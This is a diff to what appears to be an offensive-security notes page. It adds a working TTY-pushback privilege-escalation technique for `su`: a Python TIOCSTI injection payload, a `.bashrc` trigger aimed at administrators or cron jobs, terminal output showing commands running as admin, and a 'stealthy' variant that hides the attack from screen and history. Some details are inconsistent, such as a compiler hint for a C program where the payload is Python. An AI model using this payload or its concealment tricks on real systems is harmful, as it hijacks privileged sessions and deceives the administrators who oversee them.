@@ -113,6 +113,84 @@ ioctl(STDOUT, &TIOCSTI, $_) for split "", <STDIN>;
 $ echo 'id' | sudo perl tty.pl > /dev/pts/1
 ```
 
+### TTY Input Pushback (`su`)
+
+{% embed url="https://www.halfdog.net/Security/2012/TtyPushbackPrivilegeEscalation/" %}
+Explainer of the technique in the context of `su` and virtual machines
+{% endembed %}
+
+When logging in as another user with `su`, by default, the current pseudo-terminal is _reused_. This has the effect that the low-privileged user that is logged in to can send input to the TTY.&#x20;
+
+The trick we abuse is to **background** the current process programmatically, and then **keep sending input** to the TTY. After backgrounding the shell will be back to where it previously was: the original high-privileged shell that executed `su` in the first place. The input we send will then end up in that higher-up shell thus allowing malicious commands to be written and executed.&#x20;
+
+In practice, you will create some code in `~/.bashrc` that will do these actions right as the admin or cron job tries to log into your account. Here is an example that creates and compiles a C program with a specific command:
+
+{% code title="/tmp/payload.py" %}
+```renpy
+import fcntl
+import termios
+import os
+import sys
+import signal
+
+os.kill(os.getppid(), signal.SIGSTOP)
+
+for char in sys.argv[1] + '\n':
+    fcntl.ioctl(0, termios.TIOCSTI, char)
+```
+{% endcode %}
+
+{% code title="/home/hacker/.bashrc" %}
+```bash
+python3 /tmp/payload.py "id > /tmp/pwned"
+```
+{% endcode %}
+
+{% hint style="info" %}
+If `cc` or another compiler isn't available, try compiling it yourself on another comparable system with `cc -static` to link libraries statically
+{% endhint %}
+
+When that payload is placed on the `hacker` account for example, and the `admin` user tries to log in using `su hacker`, this payload executes in their terminal:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>admin@machine$ su hacker  # Trigger
+</strong>Password:
+exit
+id > /tmp/pwned
+
+hacker@machine$ exit
+exit
+<strong>admin@machine$ id > /tmp/pwned
+</strong>admin@machine$ 
+
+<strong>$ cat /tmp/pwned  # Payload was executed
+</strong>uid=1000(admin) gid=1000(admin) groups=1000(admin)
+</code></pre>
+
+{% hint style="success" %}
+If `sudo su [username]` was used, you can even **reuse** `sudo` in your payload as the _sudo token_ will still be valid (the timeout not requiring entering a password again)
+{% endhint %}
+
+#### More stealthy flow
+
+In the above example, an administrator can clearly see that something is up, as the whole payload is shown directly in their screen, twice even. The history files keep this payload, and they can always check the `.bashrc` file to find the payload.&#x20;
+
+To create a more realistic `su` experience, the entered commands should be hidden and the sequence should actually end up in a `hacker@machine` shell like the administrator expects. These two can both be done relatively easily by just editing the payload to include some more tricks:
+
+1. Use `\x0C` characters to _clear the screen_ after each command, hiding the process
+2. Prefix all commands with a   space character, which hides it from the history file
+3. After backgrounding the process, use `fg` to get back to the `hacker@machine` shell
+4. Run `clear` to completely clear all previous commands
+
+{% code title="/home/hacker/.bashrc" %}
+```bash
+echo 'id > /tmp/pwned' > /tmp/s
+chmod 777 /tmp/s
+cmd=$' /tmp/s &> /dev/null\n\x0C fg\n\x0C clear'
+
+python3 /tmp/payload.py "$cmd"
+```
+{% endcode %}
+
 ## Other tricks
 
 A few more tricks that may be useful in some cases, highly specific to the type of processing that is running.&#x20;
@@ -129,7 +207,7 @@ This command won't capture the STDIN of a password input for example, **only wha
 <pre class="language-bash" data-title=".bashrc"><code class="lang-bash"><strong>cat > /tmp/out
 </strong></code></pre>
 
-### Allow history files
+### Enable history files
 
 Sometimes a machine will try to prevent a system from logging executed commands in the history file. In bash, the `~/.bash_history` file for example will contain all the commands executed in an interactive bash shell, which may contain sensitive information like passwords or other secrets.&#x20;
 
